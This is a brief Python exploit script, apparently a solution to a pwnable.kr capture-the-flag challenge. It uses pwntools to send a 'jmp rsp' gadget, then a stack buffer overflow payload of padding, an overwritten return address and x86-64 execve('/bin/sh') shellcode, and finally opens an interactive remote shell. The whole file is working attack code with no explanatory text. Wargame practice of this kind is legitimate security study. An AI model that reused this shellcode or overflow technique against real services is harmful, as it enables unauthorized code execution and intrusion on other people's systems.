from pwn import *

def exp():
    p = remote('pwnable.kr', 9010)
    raw_input()
    jmpesp=asm("jmp rsp", arch = 'amd64', os = 'linux')
    shell =asm(
        """
        xor    rdx, rdx
        mov  rbx,0x68732f6e69622f2f
        shr    rbx,8
        push   rbx
        mov    rdi,rsp
        push   rax
        push   rdi
        mov    rsi,rsp
        mov   al,0x3b
        syscall
        mov rdi,0
        mov al, 0x3c
        syscall
        """, arch = 'amd64', os = 'linux')

    ret_addr = 0x6020A0
    payload = 'a'*0x28+p64(ret_addr)+shell   #aaaa' + p32(call_system) + p32(input_addr)
    p.sendline(jmpesp)
    p.sendline('1')
    p.sendline(payload)
    p.interactive()

exp()
